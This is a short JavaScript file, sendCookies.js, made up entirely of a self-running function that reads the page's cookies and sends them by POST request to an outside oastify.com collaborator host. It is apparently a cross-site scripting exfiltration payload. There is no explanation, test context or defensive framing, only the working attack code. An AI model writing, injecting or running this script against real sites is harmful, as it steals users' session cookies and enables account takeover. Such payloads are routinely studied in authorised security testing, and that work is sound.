// sendCookies.js
(function() {
  const cookies = document.cookie;
  fetch('http://u94wbo5222dmjdx591dyf0rmxd34r4ft.oastify.com', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'cookies=' + encodeURIComponent(cookies),
  });
})();
